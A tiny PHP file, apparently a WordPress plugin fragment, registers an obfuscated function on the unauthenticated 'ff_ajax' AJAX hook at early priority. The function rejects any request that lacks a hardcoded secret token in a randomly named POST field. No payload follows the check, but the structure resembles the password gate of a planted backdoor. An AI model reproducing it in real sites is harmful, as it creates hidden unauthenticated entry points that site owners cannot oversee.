<?php

function pop_mediaelement_genesis_wow() {
	if (!isset($_POST["mmtlrosrm"]) || $_POST["mmtlrosrm"] !== "pWCYBA6NUQZQN") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'pop_mediaelement_genesis_wow', 5, 1);
